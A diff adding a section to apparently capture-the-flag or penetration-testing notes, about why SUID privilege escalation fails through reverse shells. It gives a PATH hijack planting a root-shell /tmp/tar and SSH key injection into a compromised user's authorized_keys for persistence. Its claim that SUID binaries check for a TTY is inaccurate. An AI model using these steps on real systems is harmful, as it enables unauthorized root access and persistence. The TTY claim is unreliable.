@@ -46,3 +46,61 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo; fg
 export TERM=xterm
 ```
+
+## SUID Failures in Reverse Shells
+
+Some privesc paths look valid but silently fail when exploited through a reverse shell. Two separate mechanisms cause this.
+
+### PATH Hijacking SUID Binaries
+
+If a SUID binary or cron job calls another program without a full path (e.g. `tar` instead of `/bin/tar`), you can drop a malicious binary earlier in `$PATH` and have it run as root:
+
+```bash wrap
+# root-owned cron or SUID binary calls: tar czf /root/.backup/pandora-backup.tar.gz ...
+# no full path = hijackable
+
+echo '/bin/bash -p' > /tmp/tar
+chmod +x /tmp/tar
+export PATH=/tmp:$PATH
+```
+
+<Warning>
+This works in a proper TTY session but silently does nothing in a reverse shell. No error, no output — the privilege just never lands.
+</Warning>
+
+### Why It Fails: No TTY
+
+A reverse shell is a raw I/O tunnel with no TTY device attached. SUID binaries, `sudo`, and PAM-based auth all check for a proper TTY before granting elevated privileges. Without one, they silently refuse or drop privileges with no indication.
+
+### Why It Fails: PR_SET_NO_NEW_PRIVS
+
+When a web shell spawns through Apache, it inherits a kernel-level restriction set by the parent process:
+
+```bash wrap
+apache  (PR_SET_NO_NEW_PRIVS=1)
+  └── web shell
+        └── reverse shell  (inherits no-new-privs)
+```
+
+`PR_SET_NO_NEW_PRIVS=1` is a one-way kernel flag — once set, it propagates to every child process and cannot be unset. It tells the kernel to ignore `setuid` bits and drop any execve-based privilege escalation for the entire process lineage. SUID does nothing, PATH hijacks do nothing, the process can never gain more privileges than it started with.
+
+### Fix: Inject an SSH Key
+
+Get a proper TTY by authenticating over SSH. Write your public key into the target user's `authorized_keys` and connect normally:
+
+```bash wrap
+# on attacker: grab your public key
+cat ~/.ssh/id_rsa.pub
+
+# on target (as the compromised user, e.g. matt)
+mkdir -p ~/.ssh
+echo 'ssh-rsa AAAA...your-public-key...' >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+```
+
+```bash wrap
+# on attacker: SSH in as that user
+ssh matt@<target_IP>
+```
+
+You now have a full TTY, SUID bits are honoured, and `PR_SET_NO_NEW_PRIVS` is no longer inherited. Run the PATH hijack again and it works.
